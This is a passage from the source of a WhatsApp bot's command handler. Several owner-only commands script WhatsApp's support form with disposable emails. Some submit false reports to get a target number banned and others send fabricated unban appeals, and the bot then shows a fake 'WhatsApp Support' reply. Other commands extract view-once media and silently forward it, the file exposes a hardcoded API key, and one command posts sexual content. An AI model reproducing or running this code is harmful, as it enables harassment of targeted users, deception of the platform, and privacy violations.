form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Hello WhatsApp
Nowadays, some people have many effective ways to block user numbers and report them without any reason, in fact, I know the terms of service well and I follow them, but some hackers made a fake report to me and my number was blocked, unblock number ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replynano(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replynano(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replynano(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replynano(util.format(res.data))
} catch (err) {replynano(`${err}`)}
} else replynano('Masukkan nomor target!')
}}
break


case 'unbanwav4': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replynano(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Good afternoon WhatsApp team. My WhatsApp account has been burned permanently, please I beg you to unblock it, I can't use any other number anymore. I don't know why it was burned but my friend suggested it because I use GB WhatsApp, and I don't know it's wrong. My number is [ ${targetnya} ]. Please WhatsApp team, help me unblock my account.
Thank You`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replynano(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replynano(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replynano(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replynano(util.format(res.data))
} catch (err) {replynano(`${err}`)}
} else replynano('Enter target number!')
}}
break
//=================================================
case 'unbanwav5': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` Hello WhatsApp, my number has been stolen by hackers, please unlock it [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replynano(`Wait 1-24 hours for the unbanned process from the bot and wait ±30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replynano(`##- WhatsApp Support -##

Hello,

Thank you for contacting us.

Our system flags your account activity as a violation of our Terms of Service and blocks your phone number. We really appreciate you as a user. We apologize for any confusion or inconvenience caused by this issue.

We have removed the block after reviewing your account activity. You should now have access to WhatsApp.

As a next step, we recommend re-registering your phone number on WhatsApp to ensure you have access. You can visit our website to

download WhatsApp or the WhatsApp Business application.`)
} else if (payload.includes(`"payload":false`)) {
replynano(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replynano(util.format(res.data))
} catch (err) {replynano(`${err}`)}
} else replynano('Enter target number!')
}}
break
//=================================================



case 'bannedwa': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replynano(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` I noticed there was a user using a modified whatsapp, so I asked support to block this account because it violates the terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work.
Nomor : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replynano(`Wait 1-24 hours for the bot ban process and wait ± 30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replynano(`##- WhatsApp Support -##

It looks like you are using or asking a question about an unofficial version of WhatsApp.

To ensure you have access to WhatsApp, re-verify your phone number using our official app which can be downloaded from our website: www.whatsapp.com/download

Unofficial apps compromise your security and safety, and we do not support them.

Here's what might happen if you use it:

There is no guarantee that your messages or data such as your location or files you share will be private and secure.

Accounts may be blocked due to use of unauthorized WhatsApp applications contrary to our Terms of Service.

Following are WhatsApp's terms of service:

WhatsApp Terms of Service

1. Application Usage

You agree to use the WhatsApp application ("Application") only for lawful purposes and in accordance with applicable law. You are not permitted to use the Application for illegal purposes or to violate third party rights. You also agree not to use the Application to send, receive, or store information that violates the law or violates third party rights.

2. Copyright and Trademark

You agree that all copyrights, trademarks and other proprietary rights related to the Application are owned by WhatsApp, Inc. and/or its affiliates. You are not permitted to use or modify any copyright, trademark or other proprietary rights without the written permission of WhatsApp, Inc. or its affiliates.

3. Data Privacy and Security
WhatsApp promises to protect your privacy and data security. We will process your data in accordance with our Privacy Policy which can be accessed at https://www.whatsapp.com/legal/#privacy-policy. By using the Application, you agree to our Privacy Policy and provide your consent to process your data in accordance with our Privacy Policy. 

4. Limitation of Liability 
WhatsApp is not responsible for any losses caused by the use of the Application by you or other third parties, including but not limited to losses caused by technical failure or equipment damage, data loss, property damage, or other financial losses. 

5. Changes to Terms of Service 
WhatsApp reserves the right to change these Terms of Service at any time without prior notice. By continuing to use the Application after changes to these Terms of Service become effective, you agree to be bound by the most current version of these Terms of Service.`)
} else if (payload.includes(`"payload":false`)) {
replynano(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replynano(util.format(res.data))
} catch (err) {replynano(`${err}`)}
} else replynano('Enter target number!')
}}
break
//=================================================
//================================================\\
case 'banwav2': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replynano(`Can't verify My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", ` I noticed a user was using a modified whatsapp, so I asked support to block this account because it violates the terms of service, and the account uses a WhatsApp bot that can send malicious messages so that other users' WhatsApp cannot work.
Number : +${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replynano(`Wait 1-24 hours for the bot ban process and wait ± 30 seconds to see the email reply from WhatsApp sir Hw Mods🥺🙏`)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replynano(`##- WhatsApp Support -##

It looks like you are using or asking a question about an unofficial version of WhatsApp.

To ensure you have access to WhatsApp, re-verify your phone number using our official app which can be downloaded from our website: www.whatsapp.com/download

Unofficial apps compromise your security and safety, and we do not support them.

Here's what might happen if you use it:

There is no guarantee that your messages or data such as your location or files you share will be private and secure.

Accounts may be blocked due to use of unauthorized WhatsApp applications contrary to our Terms of Service.

Following are WhatsApp's terms of service:

WhatsApp Terms of Service

1. Application Usage

You agree to use the WhatsApp application ("Application") only for lawful purposes and in accordance with applicable law. You are not permitted to use the Application for illegal purposes or to violate third party rights. You also agree not to use the Application to send, receive, or store information that violates the law or violates third party rights.

2. Copyright and Trademark

You agree that all copyrights, trademarks and other proprietary rights related to the Application are owned by WhatsApp, Inc. and/or its affiliates. You are not permitted to use or modify any copyright, trademark or other proprietary rights without the written permission of WhatsApp, Inc. or its affiliates.

3. Data Privacy and Security
WhatsApp promises to protect your privacy and data security. We will process your data in accordance with our Privacy Policy which can be accessed at https://www.whatsapp.com/legal/#privacy-policy. By using the Application, you agree to our Privacy Policy and provide your consent to process your data in accordance with our Privacy Policy. 

4. Limitation of Liability 
WhatsApp is not responsible for any losses caused by the use of the Application by you or other third parties, including but not limited to losses caused by technical failure or equipment damage, data loss, property damage, or other financial losses. 

5. Changes to Terms of Service 
WhatsApp reserves the right to change these Terms of Service at any time without prior notice. By continuing to use the Application after changes to these Terms of Service become effective, you agree to be bound by the most current version of these Terms of Service.`)
} else if (payload.includes(`"payload":false`)) {
replynano(`##- WhatsApp Support -##

Thank you for contacting us. We will contact you back by email, and that may take up to three business days.`)
} else replynano(util.format(res.data))
} catch (err) {replynano(`${err}`)}
} else replynano('Enter target number!')
}}
break

//=================={{=[===================]]\\

case 'sanet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '🌿': case '🍀': case '☘️': { if (prefix === '.') {
 if (!DanzTheCreator) return reply(mess.only.owner)
const { xeonorwot } = require('./virtex/xeonbut2')
let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "💀" })
LordVoltage.relayMessage(m.chat, { reactionMessage }, { messageId: '🦄' })
}}
break

//=================={{=[===================]]\\
case 'tourl': { if (prefix === '.') {
	const media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	replynano(`📮 *L I N K :*
${anuu}
📊 *S I Z E :* ${media.length} Byte
📛 *E x p i r e d :* No Expiry Date`)
await fs.unlinkSync(media)
}}
	break
//=================================================================
case 'carimusik': { if (prefix === '.') {
if (!quoted) return replynano(`where's the music?`)
const media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const crii = await fetchJson(`https://api.lolhuman.xyz/api/musicsearch?apikey=efcb180d3fd3134748648887&file=${anuu}`);
	reply(`Status: success\n*Judul* : ${crii.result.title}\n*Album* : ${crii.result.album}\n`)
}}
break
//=================================================================
case 'ocr': { if (prefix === '.') {
  if (!quoted) return replynano(`mana fotonya kak?`)
  reply(mess.wait)
  const media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const data = await fetchJson(`https://api.lolhuman.xyz/api/ocr?apikey=efcb180d3fd3134748648887&img=${anuu}`)
	const textnya = data.result
	reply(`${textnya}`)
}}
break
case 'tozombie':
case 'jadizombie': { if (prefix === '.') {
  if (!quoted) return replynano(`where's the photo bro?`)
  reply(mess.wait)
  const media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const data = await fetchJson(`https://itzpire.com/tools/jadizombie?url=${anuu}`)
	const zombie = data.result
	LordVoltage.sendMessage(m.chat, { image: { url: zombie }, caption: `_Making Success ${command}_`}, { quoted: m})
}}
break



case 'vv': {if (prefix === '.') {
  // React with ⏳ at start
  await LordVoltage.sendMessage(m.chat, {
    react: {
      text: "⏳",
      key: m.key
    }
  });

  try {
    if (!DanzTheCreator) { // Using the pre-defined const
      await LordVoltage.sendMessage(m.chat, {
        react: { text: "❌", key: m.key }
      });
      return LordVoltage.sendMessage(m.chat, {
        text: "*📛 This is an owner command.*"
      }, { quoted: m });
    }

    if (!m.quoted) {
      await LordVoltage.sendMessage(m.chat, {
        react: { text: "❌", key: m.key }
      });
      return LordVoltage.sendMessage(m.chat, {
        text: "*🍁 Please reply to a view once message!*"
      }, { quoted: m });
    }

    const downloadedContent = await m.quoted.download();
    const messageType = m.quoted.mtype;
    const replyOptions = { quoted: m };

    let messagePayload = {};
    switch (messageType) {
      case "imageMessage":
        messagePayload = {
          image: downloadedContent,
          caption: m.quoted.text || '',
          mimetype: m.quoted.mimetype || "image/jpeg"
        };
        break;
      case "videoMessage":
        messagePayload = {
          video: downloadedContent,
          caption: m.quoted.text || '',
          mimetype: m.quoted.mimetype || "video/mp4"
        };
        break;
      case "audioMessage":
        messagePayload = {
          audio: downloadedContent,
          mimetype: "audio/mp4",
          ptt: m.quoted.ptt || false
        };
        break;
      default:
        await LordVoltage.sendMessage(m.chat, {
          react: { text: "❌", key: m.key }
        });
        return LordVoltage.sendMessage(m.chat, {
          text: "❌ Only image, video, and audio messages are supported"
        }, { quoted: m });
    }

    await LordVoltage.sendMessage(m.chat, messagePayload, replyOptions);

    // React with ✅ on success
    await LordVoltage.sendMessage(m.chat, {
      react: {
        text: "✅",
        key: m.key
      }
    });

  } catch (error) {
    console.error("vv Error:", error);
    await LordVoltage.sendMessage(m.chat, {
      react: {
        text: "❌",
        key: m.key
      }
    });
    await LordVoltage.sendMessage(m.chat, {
      text: "❌ Error fetching vv message:\n" + error.message
    }, { quoted: m });
  }
}}
break;

case 'vv2': {
  // React with ⏳ at start (optional)
  await LordVoltage.sendMessage(m.chat, {
    react: {
      text: "⏳",
      key: m.key
    }
  });

  try {
    if (!DanzTheCreator) {
      return; // Silent fail for non-owners
    }

    if (!m.quoted) {
      return; // Silent fail if not replying
    }

    const downloadedContent = await m.quoted.download();
    const messageType = m.quoted.mtype;
    const yourDmJid = m.sender;

    let messagePayload = {};
    switch (messageType) {
      case "imageMessage":
        messagePayload = { image: downloadedContent, caption: m.quoted.text || '', mimetype: m.quoted.mimetype || "image/jpeg" };
        break;
      case "videoMessage":
        messagePayload = { video: downloadedContent, caption: m.quoted.text || '', mimetype: m.quoted.mimetype || "video/mp4" };
        break;
      case "audioMessage":
        messagePayload = { audio: downloadedContent, mimetype: "audio/mp4", ptt: m.quoted.ptt || false };
        break;
      default:
        return; // Silent fail for unsupported types
    }

    await LordVoltage.sendMessage(yourDmJid, messagePayload);

    // Optional success reaction for owner
    await LordVoltage.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

  } catch (error) {
    console.error("vv2 Error (silent):", error);
    // Optional error reaction for owner
    // await LordVoltage.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
  }
}
break;

case 'join': { if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!text) return replynano(`Example ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replynano('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await LordVoltage.groupAcceptInvite(result)
await replynano(`Done`)
}}
break
case 'poll': { if (prefix === '.') {
	if (!DanzTheCreator) return reply(mess.only.owner)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await replynano(
`Please state the question and at least 2 choices\nExample: ${prefix}poll Who is the best admin?|Danz,Asep,Doge...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await LordVoltage.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }}
        break
        case 'vote': { if (prefix === '.') {
            if (!m.isGroup) return reply(mess.only.group)
            if (m.chat in vote) return replynano(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replynano(`Enter Reason for Choosing, Example: *${prefix + command} Handsome Owner*`)
            replynano(`Voting begins!\n\n*${prefix}upvote* - to upvote\n*${prefix}downvote* - to downvote\n*${prefix}checkvote* - to check votes\n*${prefix} deletevote* - to delete votes`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            LordVoltage.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }}
            break
               case 'upvote': { if (prefix === '.') {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replynano('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            LordVoltage.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }}
             break
case 'downvote': { if (prefix === '.') {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replynano('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            LordVoltage.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}}
            break
 
case 'checkvote':if (prefix === '.') {
if (!m.isGroup) return reply(mess.only.group)
if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${LordVoltage.user.id}
`
LordVoltage.sendTextWithMentions(m.chat, teks_vote, m)}
break
		case 'deletevote': case 'delvote': case 'hapusvote': { if (prefix === '.') {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replynano('Successfully Deleted Vote Session In This Group')
	    }}
            break
case 'tovv':
case 'toviewonce': {
    if (prefix === '.') {
        if (!m.quoted) return replynano(`Reply to view the message once`)

        const quotedMessage = m.quoted.message;
        if (!quotedMessage) return replynano(`Quoted message not found`);

        const viewOnceWrapper = quotedMessage.viewOnceMessageV2 || quotedMessage.viewOnceMessage; // Check for both Baileys versions
        if (!viewOnceWrapper) return replynano(`This is not a view once message`);

        const actualMessage = viewOnceWrapper.message;
        if (!actualMessage) return replynano(`Inner message not found`);

        const type = Object.keys(actualMessage)[0];

        if (type === 'imageMessage' || type === 'videoMessage') {
            const media = await downloadContentFromMessage(actualMessage[type], type === 'imageMessage' ? 'image' : 'video');
            let buffer = Buffer.from([]);
            for await (const chunk of media) {
                buffer = Buffer.concat([buffer, chunk]);
            }

            await LordVoltage.sendMessage(
                m.chat,
                {
                    viewOnceMessage: {
                        message: {
                            [type]: {
                                ...actualMessage[type],
                                jpegThumbnail: type === 'imageMessage' ? await reSize(buffer, 100, 100) : undefined // Optional: Add thumbnail for videos
                            }
                        }
                    }
                },
                { quoted: m }
            );
        } else {
            replynano(`This quoted message is not a view once image or video.`);
        }
    }
    break;
}

break
case 'fliptext': { if (prefix === '.') {
if (args.length < 1) return replynano(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replynano(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}}
break
case 'paptt': { if (prefix === '.') {
 if (!isPrem) return replyprem(mess.premium)
global.paptt = [
 "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
 "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
 "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
 "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
 "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
 "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
 "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
 "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
 "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
 "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
 "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
 "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
 "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
 ]
	let url = paptt[Math.floor(Math.random() * paptt.length)]
	LordVoltage.sendFile(m.chat, url, null, 'Aww..umm💦,am so horny come ride my pu**y anyhow u want🤤🍑🍆', m)
}}
break
 case 'alkitab':
case 'bible2':{if (prefix === '.') 
     if (!text) return reply( `uhm.. where is the text?\n\nexample:\n${prefix + command} incident`)
     let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } }) 
  
     let $ = cheerio.load(res.data) 
     let result = [] 
     $('div.vw').each(function (a, b) { 
         let teks = $(b).find('p').text().trim() 
         let link = $(b).find('a').attr('href') 
         let title = $(b).find('a').text().trim() 
         result.push({ teks, link, title }) 
     }) 
 
   let foto = 'https://telegra.ph/file/a333442553b1bc336cc55.jpg'
   let judul = '*────────「 Bible 」 ────────*'
     let caption = result.map(v => `💌 ${v.title}\n📮 ${v.teks}`).join('\n┄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┄\n') 
      LordVoltage.sendFile(m.chat, foto, 'alkitab.jpg', `${judul}\n\n${caption}`, m)
 } 
break
            case 'listpc': { if (prefix === '.') {
 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
 for (let i of anulistp) {
 let nama = store.messages[i].array[0].pushName
 teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 LordVoltage.sendTextWithMentions(m.chat, teks, m)
             }}
             break
case 'listgc': { if (prefix === '.') {
 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
 for (let i of anulistg) {
 let metadata = await LordVoltage.groupMetadata(i)
 teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Africa/Lagos').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 LordVoltage.sendTextWithMentions(m.chat, teks, m)
             }}
             break
             case 'ping2': case 'botstatus': case 'statusbot': { if (prefix === '.') {
             const uptime = getUptime();
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${uptime}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

